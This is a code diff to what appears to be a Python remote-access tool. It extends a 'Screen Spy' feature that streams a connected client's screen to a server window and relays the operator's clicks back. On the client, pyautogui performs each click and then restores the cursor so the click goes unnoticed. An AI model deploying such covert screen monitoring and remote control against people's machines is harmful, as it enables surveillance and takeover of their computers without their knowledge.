@@ -1,5 +1,5 @@
-import io, time, threading
-import time, io
+import io, pyautogui, threading
+import io
 
 from PIL import ImageGrab, ImageTk, Image
 from typing import TYPE_CHECKING
@@ -21,25 +21,56 @@ class tkinterWindow(tk.Tk):
     WINDOW_WIDHT = 1280
     WINDOW_HEIGHT = 720
 
-    def __init__(self, on_close: Callable):
+    def __init__(self, on_close: Callable, netServer: "NetterServer", client: "NetterClient"):
         super().__init__()
-
-        self.on_close = on_close
-
         self.title("Screen Spy")
         self.geometry(f"{self.WINDOW_WIDHT}x{self.WINDOW_HEIGHT}")
 
-        self.imageLabel = tk.Label(self)
-        self.imageLabel.pack(fill="both", expand=True)
+        self.screenResolution = list(map(int, client.screenResolution.split("x")))
+        self.ratio_x = self.screenResolution[0] / self.WINDOW_WIDHT
+        self.ratio_y = self.screenResolution[1] / self.WINDOW_HEIGHT
 
+        self.netServer = netServer
+        self.on_close = on_close
+        self.client = client
+        self.image_id = None
+        self.currentimg = None
+
+        self.canvas = tk.Canvas(self)
+        self.canvas.bind("<Button-1>", self.left_click)
+        self.canvas.pack(fill="both", expand=True)
         self.protocol("WM_DELETE_WINDOW", self.on_close)
+        self.bind("<Configure>", self.on_resize)
+        # self.mouseListener.start()
 
     def change_image(self, data):
-        img = Image.open(data).resize((self.WINDOW_WIDHT, self.WINDOW_HEIGHT))
-        frame = ImageTk.PhotoImage(img)
+        self.currentimg = data
 
-        self.imageLabel.config(image=frame)
-        self.imageLabel.image = frame
+        try:
+            self.frame = ImageTk.PhotoImage(self.currentimg)
+
+        except ValueError:
+            return
+
+        if self.image_id is None:
+            self.image_id = self.canvas.create_image(0, 0, anchor="nw", image=self.frame)
+        else:
+            self.canvas.itemconfig(self.image_id, image=self.frame)
+
+    def left_click(self, event):
+        widget_under_cursor = self.winfo_containing(event.x_root, event.y_root)
+
+        if widget_under_cursor is not None and widget_under_cursor == self.canvas:
+            x, y = self.canvas.canvasx(event.x), self.canvas.canvasy(event.y)
+            adjusted_x, adjusted_y = int(x * self.ratio_x), int(y * self.ratio_y)
+            self.client.socket_.send_(packetType=PacketType.COMMAND, data=("spy", (adjusted_x, adjusted_y)))
+
+    def on_resize(self, event):
+        self.WINDOW_WIDHT = event.width
+        self.WINDOW_HEIGHT = event.height
+        self.ratio_x = self.screenResolution[0] / self.WINDOW_WIDHT
+        self.ratio_y = self.screenResolution[1] / self.WINDOW_HEIGHT
+        self.change_image(self.currentimg)
 
 
 class screenSpyCommand(CommandBase):
@@ -74,7 +105,7 @@ class screenSpyCommand(CommandBase):
             self.tkObject.destroy()
 
         def run_ui():
-            self.tkObject = tkinterWindow(on_close=on_close)
+            self.tkObject = tkinterWindow(on_close=on_close, netServer=netServer, client=selectedClient)
             self.tkObject.mainloop()
 
         threading.Thread(target=run_ui, daemon=True).start()
@@ -85,10 +116,21 @@ class screenSpyCommand(CommandBase):
 
         if self.tkObject:
             data = io.BytesIO(decompress(packet.data))
-            self.tkObject.after(0, self.tkObject.change_image, data)
+            self.tkObject.after(
+                0, self.tkObject.change_image, Image.open(data).resize((self.tkObject.WINDOW_WIDHT, self.tkObject.WINDOW_HEIGHT))
+            )
 
-    def on_client_receive(self, serverHandler: "Connect"):
-        self.isRunning = not self.isRunning
+    def on_client_receive(self, serverHandler: "Connect", *args):
+        if not args:
+            self.isRunning = not self.isRunning
+        else:
+            old_x, old_y = pyautogui.position()
+
+            pyautogui.moveTo(x=args[0][0], y=args[0][1])
+            # time.sleep(0.1)
+            pyautogui.click()
+
+            pyautogui.moveTo(x=old_x, y=old_y)
 
         while self.isRunning:
             yield self.capture_screen()
